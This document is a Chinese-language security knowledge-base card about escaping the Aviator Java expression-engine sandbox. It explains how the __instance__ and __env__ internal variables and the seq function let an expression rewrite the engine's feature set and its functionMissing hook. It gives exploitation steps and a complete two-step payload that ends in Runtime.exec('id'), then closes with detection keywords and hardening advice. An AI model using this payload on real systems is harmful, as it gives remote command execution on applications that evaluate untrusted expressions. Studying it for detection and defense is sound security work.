---
id: binary-pwn-sandbox-escape-aviator-internalvars-seq-reflection
title: Aviator 表达式引擎沙箱逃逸：InternalVars + seq 改写 features 与 functionMissing
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: aviator-sandbox-escape
aliases:
- Aviator 沙箱逃逸
- Aviator 表达式注入绕过
- __instance__ 逃逸
- __env__ 逃逸
- JavaMethodReflectionFunctionMissing
- Aviator InternalVars
- Aviator functionMissing 替换
tags:
- java
- aviator
- sandbox-escape
- expression-engine
- internalvars
- reflection
- rce
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V24
  verified_at: '2026-11-05T03:05:57+08:00'
  notes: 已对照原文核对：仅禁用 NewInstance/Use/Module/StaticMethods/StaticFields 与清空 ALLOWED_CLASS_SET 但保留 InternalVars/seq/ForLoop；__instance__/__env__ 读取、enumConstants[16]/[8] 取 Feature、seq.add 回 features、Class.forName+Reflector.setProperty 替换 functionMissing 为 JavaMethodReflectionFunctionMissing、再反射 Runtime.exec 的两步 PoC 均与原文一致。卡片 confidence medium 及“枚举下标依赖 Aviator 版本”的边界正确；原文只在 JimuReport 2.5.1 自带 Aviator 验证，未给 Aviator 版本区间，故不设 affected_versions。PoC 未在本机执行。
---

## 一句话结论

Aviator 实例如果只移除了 `NewInstance` / `Use` / `Module` / `StaticMethods` / `StaticFields` 并清空 `ALLOWED_CLASS_SET`，却保留 `InternalVars`、内置 `seq` 与 `ForLoop`，那么受控表达式可以读取 `__instance__`（引擎实例）和 `__env__`（执行环境），用 `seq.put` 改写实例的 `features` 与 `functionMissing`，重新打开反射后调用任意 Java 方法，典型落点是 `Runtime.getRuntime().exec()`。

## 原理

- Aviator 的沙箱不是独立进程隔离，而是同一 JVM 内靠“功能开关 + 类白名单”约束表达式。`AviatorEvaluatorInstance` 把禁用项记录在 `features` 集合中；`ExpressUtil` 一类封装通常会 `disableFeature(NewInstance/Use/Module/StaticMethods/StaticFields)` 并清空 `ALLOWED_CLASS_SET`，让表达式既不能 `new`、不能 `use`/`import`，也不能点出静态方法或字段。
- 但引擎默认开启 `InternalVars`，表达式里可以直接引用内部变量 `__instance__`（当前 `AviatorEvaluatorInstance`）和 `__env__`（传给 `execute()` 的环境 Map）。这两个变量把“执行上下文对象本身”暴露给了表达式，等于把沙箱的配置权交回给被沙箱约束的代码。
- `seq` 是 Aviator 的内置可变集合函数：`seq.put(map, key, value)` 可写 Map、`seq.get/seq.add` 可读写集合。配合默认开启的 `ForLoop`，表达式可以遍历 `__instance__.features`，对每个 Feature 枚举常量取 `x.declaringClass.enumConstants[i]`，按数组下标拿到被禁用的 `StaticMethods` 与函数相关 Feature（原文脚本标记为 `_sm`、`_fn`），再用 `seq.add(__instance__.features, ...)` 把它们从禁用集合里移除——等价于重新启用。
- 同一表达式把 `__instance__.Class` 存进 `__env__`，再取 `c.Class` 得到 `java.lang.Class`，从而可以 `CC.forName('com.googlecode.aviator.runtime.JavaMethodReflectionFunctionMissing')` 和 `CC.forName('com.googlecode.aviator.utils.Reflector')`。随后 `RF.setProperty(__env__, '__instance__.functionMissing', FM.getInstance())` 把引擎解析“未知函数”的钩子替换成反射版实现。
- `functionMissing` 是 Aviator 在遇到未注册函数名时的兜底解析器。换成 `JavaMethodReflectionFunctionMissing` 后，`RT.getRuntime()`、`exec(r, cmd)` 这类未知函数调用会被反射分发到真正的 Java 静态/实例方法，沙箱的功能开关已无法约束，最终得到任意方法调用与命令执行。
- 关键点：这不是“找到一个未过滤的类”，而是**改写了引擎自身的配置对象**。所以只需要一次表达式注入点，且改动会持久化在共享的 JVM 单例实例上，后续表达式无需重复逃逸。

## 触发条件

- 应用把用户可控字符串交给 Aviator 编译执行（规则引擎、低代码报表、参数计算、动态查询等表达式注入入口）。本卡是逃逸原语，本身不提供入口。
- 目标 Aviator 实例仍启用 `InternalVars`，`seq` 内置函数可用，`ForLoop` 未被禁用；`features` 中已禁用反射类 Feature 但实例对象可从表达式访问。
- payload 中 `enumConstants[16]` / `[8]` 的硬编码下标要匹配目标 Aviator 版本的 Feature 枚举顺序；不同版本需先枚举再定位（见“变体与关联”）。
- 逃逸成功后，攻击者能触达的类取决于目标 classpath；`java.lang.Runtime` 一定存在。

## 利用步骤

1. 确认存在表达式执行：提交 `1+1` 或 `seq.size(seq.list(1,2))` 观察返回值/报错，判断 Aviator 可用。
2. 探测内部变量：提交 `__instance__` 或 `__instance__.Class`，确认 `InternalVars` 未关闭；提交 `seq.put(seq.map('a',1),'b',2)` 确认 `seq` 可写。
3. 枚举 Feature：用 `for x in __instance__.features { ... }` 读取当前禁用的 Feature 集合，确认 `StaticMethods` 等目标常量的下标（原文环境为 16 与 8）。
4. 发送逃逸表达式：循环取目标 Feature 常量并 `seq.add` 回 `features`，同时用 `Class.forName` + `Reflector.setProperty` 把 `__instance__.functionMissing` 替换为 `JavaMethodReflectionFunctionMissing`。
5. 发送执行表达式：反射取 `Runtime.getRuntime()`，调用 `exec`；或用 `ProcessBuilder`、文件写入等任意可达方法验证。
6. 用命令副作用确认权限与结果（写文件、`whoami`、带外回连）。

## PoC

STEP1 逃逸并持久化（Feature 下标以原文环境为准）：

```text
=for x in __instance__.features { seq.put(__instance__.funcMap, '_sm', x.declaringClass.enumConstants[16]); seq.put(__instance__.funcMap, '_fn', x.declaringClass.enumConstants[8]) }; seq.add(__instance__.features, seq.get(__instance__.funcMap, '_sm')); seq.add(__instance__.features, seq.get(__instance__.funcMap, '_fn')); seq.put(__env__, 'c', __instance__.Class); seq.put(__env__, 'CC', c.Class); seq.put(__env__, 'FM', CC.forName('com.googlecode.aviator.runtime.JavaMethodReflectionFunctionMissing')); seq.put(__env__, 'RF', CC.forName('com.googlecode.aviator.utils.Reflector')); RF.setProperty(__env__, '__instance__.functionMissing', FM.getInstance()) * 1*4831927
```

STEP2 反射调用 Runtime：

```text
=seq.put(__env__, 'c', __instance__.Class); seq.put(__env__, 'CC', c.Class); seq.put(__env__, 'RT', CC.forName('java.lang.Runtime')); seq.put(__env__, 'r', RT.getRuntime()); exec(seq.get(__env__, 'r'), 'id') * 1*4831927
```

说明：表达式末尾的 `* 1*<数字>` 用于把整条 `seq` 链收敛成数值返回值，便于宿主把结果 `toString()`；这是结构化复现，未在本会话执行。不同 Aviator 版本的 Feature 枚举顺序可能不同，使用前先枚举确认。

## 变体与关联

- 变体（版本适配）：若 `enumConstants[16]/[8]` 不对应目标版本，可在 `for x in __instance__.features` 中读取每个 `x` 的字符串表示来枚举 Feature 名称与顺序，再按实际下标取常量；也可直接 `Class.forName` Feature 枚举类后读取其 `enumConstants` 数组逐个匹配。
- 变体（sink）：`functionMissing` 换成反射实现后，可用任意静态/实例方法。除 `Runtime.exec` 外，还可 `ProcessBuilder`、文件读写、`ClassLoader` 加载字节码等；能否落地取决于目标 JDK 与 classpath。
- 关联：[[web-java-component-jimureport-unauth-aviator-rce]]（该原语在 JimuReport v2.5.1 未授权导出接口上的完整入口与利用链）。
- 关联：[[binary-pwn-sandbox-escape-groovy-interpreter-reinstantiation]]（同为 JVM 内脚本/表达式沙箱逃逸：通过重新获得编译/反射能力绕开黑名单）。
- 边界：关闭 `InternalVars`、移除 `seq`、禁用 `ForLoop`、或用 AST 白名单限制变量与函数名后，本路径不成立；若表达式在独立进程执行且无反射类可达，也只能得到计算能力。

## 检测与防御

- 检测：表达式/脚本文本中出现 `__instance__`、`__env__`、`seq.put`、`seq.add`、`enumConstants`、`functionMissing`、`JavaMethodReflectionFunctionMissing`、`Reflector.setProperty`、`Class.forName`、`getRuntime` 的组合。
- 检测：同一 JVM 内先出现遍历 `features` 的表达式，随后出现反射式函数调用；报表/规则引擎进程派生 `sh -c`、`cmd.exe /c` 子进程。
- 检测：Aviator 相关类在运行期被 `Class.forName` 加载、或表达式结果异常地返回数值（`* 1*<随机数>` 收敛特征）。
- 防御：不要对不可信输入做表达式求值；必须求值时，为每次执行创建独立实例并关闭 `InternalVars`、移除 `seq`、禁用 `ForLoop`，不要依赖 Feature 黑名单作为安全边界。
- 防御：在执行前对表达式做 AST 级白名单（仅允许常量、白名单函数与受限变量），并拒绝任何对引擎实例/执行环境的引用。
- 防御：把表达式求值放到低权限独立进程/容器中，限制子进程、文件系统与网络；跟进 Aviator 安全公告并升级到已修复沙箱逃逸的版本。
